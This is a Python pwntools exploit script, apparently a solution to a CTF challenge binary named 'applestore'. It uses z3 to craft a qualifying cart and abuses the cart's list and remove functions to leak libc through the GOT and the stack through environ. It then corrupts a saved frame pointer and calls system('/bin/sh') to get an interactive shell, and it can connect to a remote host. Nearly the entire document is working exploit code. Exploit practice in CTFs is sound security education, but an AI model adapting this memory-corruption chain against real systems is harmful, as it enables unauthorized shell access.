#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from z3 import *
import ctypes

exe = context.binary = ELF('applestore_patched', checksec=False)
libc = exe.libc

context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *handler+157
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def add_to_cart(number):
    io.sendafter(b">", b"2")
    io.sendafter(b">", str(number).encode())

def remove_from_cart(number, val=b""):
    io.sendafter(b">", b"3" + val)
    io.sendafter(b">", str(number).encode())

def list_cart(val=b""):
    io.sendafter(b">", b"4" + val)
    io.sendafter(b">", b"y")

def checkout():
    io.sendafter(b">", b"5")
    io.sendafter(b">", b"y")

def trigger(val=b""):
    io.sendafter(b">", b"6" + val)

def generate():
    prices = [199, 299, 499, 399, 199]
    sum_constraint = 0x1C06
    result = {}

    soln = [Int(f'x_{i}') for i in range(len(prices))]
    s = Solver()

    for x in soln:
        s.add(x >= 0)

    total = Sum([prices[i] * soln[i] for i in range(len(prices))])
    s.add(total == sum_constraint)

    if s.check() == sat:
        m = s.model()
        for i in range(len(soln)):
            result[i] = m[soln[i]].as_long()
    else:
        print("No solution found")

    return result

def solve():

    result = generate()
    for key, val in result.items():
        for _ in range(val):
            add_to_cart(key+1)

    checkout()

    # leak libc
    list_cart(p32(0x080462, big=True) + b"A"*3 + p32(exe.got["asprintf"]) + p32(0))
    io.recvuntil(b"28: ")
    leak = io.recvlines(2)[-1].split(b"$")[-1]
    leak = ctypes.c_uint32(int(leak)).value
    libc.address = leak - libc.sym["atoi"]
    info("libc base: %#x", libc.address)

    # write &environ to bss section
    bss = 0x0804b0a0
    remove_from_cart(28, p32(0x080462, big=True) + b"A"*3 + p32(libc.sym["environ"]) + p32(bss - 8))

    # leak stack from environ
    list_cart(p32(0x080462, big=True) + b"A"*3 + p32(bss) + p32(0))
    io.recvuntil(b"29: ")
    leak = io.recvline()
    mem   = u32(leak[:4])
    ebp   = mem - 0xc4
    chain = mem - 0xe8
    info("[environ]: %#x", mem)
    info("saved ebp [%#x] => chain [%#x]", ebp, chain)

    # now write to handle saved ebp to corrupt main ebp!
    remove_from_cart(28, p32(0x080462, big=True) + b"A"*3 + p32(chain) + p32(ebp - 0x8))
    trigger(b"A" + p32(libc.sym["system"]) + p32(0x0) + p32(next(libc.search(b"/bin/sh"))))
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

